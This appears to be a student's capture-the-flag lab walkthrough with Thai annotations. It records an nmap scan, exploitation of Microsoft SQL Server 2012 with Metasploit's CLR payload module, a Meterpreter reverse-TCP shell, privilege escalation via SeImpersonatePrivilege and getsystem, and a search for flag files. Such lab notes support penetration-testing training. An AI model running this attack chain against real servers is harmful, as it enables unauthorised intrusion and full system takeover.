`nmap -sC -sV target.ine.local — min-rate 1000`
`nmap --top-ports 65536 target.ine.local -sV`
1433/tcp  open  ms-sql-s           Microsoft SQL Server 2012 11.00.6020; SP3

`msfconsole`
`search MSSQL 2012`
exploit/windows/mssql/mssql_clr_payload      1999-01-01       excellent  Yes    Microsoft SQL Server Clr Stored Procedure Payload Execution

`use 0`
`set RHOSTS target.ine.demo`
`exploit`

Exploit aborted due to failure: bad-config: Target SQL server arch is x64, payload architecture is x86
`set PAYLOAD windows/x64/meterpreter/reverse_tcp`
สถาปัตย์ไม่ตรง ต้องแก้ payload
`run`

`shell`

`dir /a:d` show only directory

`cd config` 
Access is denied.

`ctrl + c`
exit tunnal
`getprivs` 
แสดงสิทธิที่ user 

SeAssignPrimaryTokenPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeImpersonatePrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege

SeImpersonatePrivilege  ใช้ยกระดับสิทธิตัวเองได้
`getsystem` ใช้ยกระดับสิทธิเป็น system

`search -f flag*.txt`
find flag

`dir C:\Windows\System32\*.txt /s /b` 
search txt 

EscaltePrivilageToGetThisFlag.txt